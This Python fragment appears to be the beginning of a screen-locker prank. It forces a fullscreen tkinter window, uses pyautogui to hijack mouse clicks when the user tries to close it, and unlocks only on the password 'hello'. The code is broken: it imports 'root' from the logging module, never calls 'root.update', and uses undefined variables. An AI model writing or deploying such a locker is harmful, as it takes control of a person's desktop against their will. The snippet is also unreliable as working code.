from logging import root
from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep


def callback(event):
    global k, entry
    if entry.get() == 'hello':
        k = True


def on_closing():
    click(675, 420)
    moveTo(675, 420)
    root.attributes('-fullscreen', True)
    root.protocol('WM_DELETE_WINDOW', on_closing)
    root.update
    root.bind('<Control-KeyPress-c>', callback)

